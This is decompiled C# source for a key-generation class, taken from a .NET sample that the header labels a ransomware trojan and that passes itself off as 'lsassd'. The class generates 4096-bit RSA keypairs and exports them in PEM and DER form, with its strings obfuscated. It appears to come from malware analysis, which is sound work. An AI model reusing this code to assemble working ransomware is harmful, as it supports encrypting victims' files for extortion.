// Decompiled with JetBrains decompiler
// Type: MOISHE.Core.KeyGenerator
// Assembly: lsassd, Version=3.4.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 432C6617-1CB7-4116-A49C-FF7B0B5EE7E5
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Crypmod.gen-b3ebc327773f5f846deeb1255475644a630c4d0d3b4eda3bbf995a36599c07cf.exe

using \u003CPrivateImplementationDetails\u003E\u007B18A11B1C\u002D3AA7\u002D4357\u002DAAD9\u002DCC83BB5216E3\u007D;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace MOISHE.Core
{
  public class KeyGenerator
  {
    public const string PEM_RSA_PRIVATE_START = "-----BEGIN RSA PRIVATE KEY-----";
    public const string PEM_RSA_PRIVATE_END = "-----END RSA PRIVATE KEY-----";
    public const string PEM_RSA_PUBLIC_START = "-----BEGIN RSA PUBLIC KEY-----";
    public const string PEM_RSA_PUBLIC_END = "-----END RSA PUBLIC KEY-----";

    public RSAParameters keypair { get; set; }

    public KeyGenerator() => this.Refresh();

    public void Refresh() => this.keypair = new RSACryptoServiceProvider(4096).ExportParameters(true);

    public Session NewSession() => new Session(this.keypair);

    public void ImportPublicKeyDER(byte[] buffer) => this.keypair = KeyGenerator.ImportPublicKey(buffer);

    public void ImportPublicKeyPEM(string encoded) => this.ImportPublicKeyDER(Convert.FromBase64String(encoded.Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ap(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aQ(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.e(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.f(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.G(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.g(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Trim()));

    public string PublicKeyPEM()
    {
      byte[] inArray = KeyGenerator.ExportPublicKey(this.keypair);
      string str1 = \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ap();
      string base64String = Convert.ToBase64String(inArray, Base64FormattingOptions.InsertLineBreaks);
      string str2 = \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aQ();
      return str1 + \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aq() + base64String + \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aq() + str2;
    }

    public string PrivateKeyPEM()
    {
      byte[] inArray = KeyGenerator.ExportPrivateKey(this.keypair);
      string str1 = \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aR();
      string base64String = Convert.ToBase64String(inArray, Base64FormattingOptions.InsertLineBreaks);
      string str2 = \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ar();
      return str1 + \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aq() + base64String + \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aq() + str2;
    }

    public static byte[] ExportPrivateKey(RSAParameters KeyPair)
    {
      using (MemoryStream output1 = new MemoryStream())
      {
        BinaryWriter binaryWriter1 = new BinaryWriter((Stream) output1);
        binaryWriter1.Write((byte) 48);
        using (MemoryStream output2 = new MemoryStream())
        {
          BinaryWriter binaryWriter2 = new BinaryWriter((Stream) output2);
          KeyGenerator.A(binaryWriter2, new byte[1]);
          KeyGenerator.A(binaryWriter2, KeyPair.Modulus);
          KeyGenerator.A(binaryWriter2, KeyPair.Exponent);
          KeyGenerator.A(binaryWriter2, KeyPair.D);
          KeyGenerator.A(binaryWriter2, KeyPair.P);
          KeyGenerator.A(binaryWriter2, KeyPair.Q);
          KeyGenerator.A(binaryWriter2, KeyPair.DP);
          KeyGenerator.A(binaryWriter2, KeyPair.DQ);
          KeyGenerator.A(binaryWriter2, KeyPair.InverseQ);
          int length = (int) output2.Length;
          KeyGenerator.A(binaryWriter1, length);
          binaryWriter1.Write(output2.GetBuffer(), 0, length);
        }
        return output1.GetBuffer();
      }
    }

    public static byte[] ExportPublicKey(RSAParameters KeyPair)
    {
      RSACryptoServiceProvider key = new RSACryptoServiceProvider();
      key.ImportParameters(KeyPair);
      return key.ExportRSAPublicKey();
    }

    public static RSAParameters ImportPublicKey(byte[] buffer)
    {
      RSACryptoServiceProvider key = new RSACryptoServiceProvider();
      key.ImportRSAPublicKey(buffer, out int _);
      return key.ExportParameters(false);
    }

    private static void A([In] BinaryWriter obj0, [In] int obj1)
    {
      if (obj1 < 0)
        throw new ArgumentOutOfRangeException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aS(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.@as());
      if (obj1 < 128)
      {
        obj0.Write((byte) obj1);
      }
      else
      {
        int num1 = obj1;
        int num2 = 0;
        while (num1 > 0)
        {
          num1 >>= 8;
          ++num2;
        }
        obj0.Write((byte) (num2 | 128));
        for (int index = num2 - 1; index >= 0; --index)
          obj0.Write((byte) (obj1 >> 8 * index & (int) byte.MaxValue));
      }
    }

    private static void A([In] BinaryWriter obj0, [In] byte[] obj1, bool _param2 = true)
    {
      obj0.Write((byte) 2);
      int index1 = 0;
      for (int index2 = 0; index2 < obj1.Length && obj1[index2] == (byte) 0; ++index2)
        ++index1;
      if (obj1.Length - index1 == 0)
      {
        KeyGenerator.A(obj0, 1);
        obj0.Write((byte) 0);
      }
      else
      {
        if (_param2 && obj1[index1] > (byte) 127)
        {
          KeyGenerator.A(obj0, obj1.Length - index1 + 1);
          obj0.Write((byte) 0);
        }
        else
          KeyGenerator.A(obj0, obj1.Length - index1);
        for (int index3 = index1; index3 < obj1.Length; ++index3)
          obj0.Write(obj1[index3]);
      }
    }

    public static byte[] DecodePEMToDER(string privateKey) => Convert.FromBase64String(File.ReadAllText(privateKey).Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aR(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ar(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.e(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Replace(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.f(), \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.F()).Trim());
  }
}
